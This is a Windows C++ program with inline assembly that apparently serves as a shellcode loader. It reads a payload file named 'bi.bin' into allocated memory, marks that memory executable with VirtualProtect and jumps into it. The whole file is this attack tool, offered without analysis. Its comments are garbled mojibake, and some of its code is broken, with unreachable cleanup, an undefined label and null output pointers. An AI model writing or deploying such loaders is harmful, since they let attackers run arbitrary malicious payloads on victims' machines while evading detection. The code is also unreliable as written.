#include <Windows.h>
#include <iostream>
int main()
{
    HANDLE hFile;
    LPCSTR FileName= "bi.bin"; //�����ص�shellcode Bin�ļ�
    DWORD dwFileSize;
    LPVOID lpFileContent;
    DWORD dwOldProtect;
    PDWORD dwOldProtectPDWD;
    DWORD dwBytesRead = 0;
    BOOL bResult;
    LPDWORD dwBytesReadLPD;
    __asm {
        mov     eax,FileName
        push    NULL
        push    FILE_ATTRIBUTE_NORMAL
        push    OPEN_EXISTING
        push    NULL
        push    FILE_SHARE_READ
        push    GENERIC_READ
        push    eax
        call    CreateFile
        mov     hFile,eax
        mov     eax,hFile
        push    NULL
        push    eax
        call    GetFileSize
        mov     dwFileSize,eax
        mov     eax, dwFileSize //��dwFileSize����������eax�Ĵ���
        push    PAGE_READWRITE  //��PAGE_READWRITEѹ��ջ��
        push    MEM_COMMIT      //��MEM_COMMITѹ��ջ��
        push    eax             //�����dwFileSize�ļĴ����е�ֵѹ��ջ��
        push    NULL            //������
        call    VirtualAlloc    //֪ͨ������ʬ
        mov     lpFileContent,eax //����
        mov     eax,dwBytesRead
        mov     dwBytesReadLPD,eax
        mov     eax,dwBytesReadLPD
        push    NULL
        mov     eax,dwBytesReadLPD
        push    eax
        mov     eax,dwFileSize
        push    eax
        mov     eax,lpFileContent
        push    eax
        mov     eax,hFile
        push    eax
        call    ReadFile
        mov     bResult,eax
        mov     eax, hFile
        push    eax
        call    CloseHandle
        mov     eax,dwOldProtect
        mov     dwOldProtectPDWD, eax
        mov     eax, dwOldProtectPDWD
        push    eax
        push    PAGE_EXECUTE_READ
        mov     eax, dwFileSize
        push    eax
        mov     eax, lpFileContent
        push    eax
        call    VirtualProtect
        mov     eax, lpFileContent
        jmp     eax
        push    MEM_RELEASE
        push    0
        push    eax
        call    VirtualFree
        mov     eax,0
        jmp     exit
    }
}
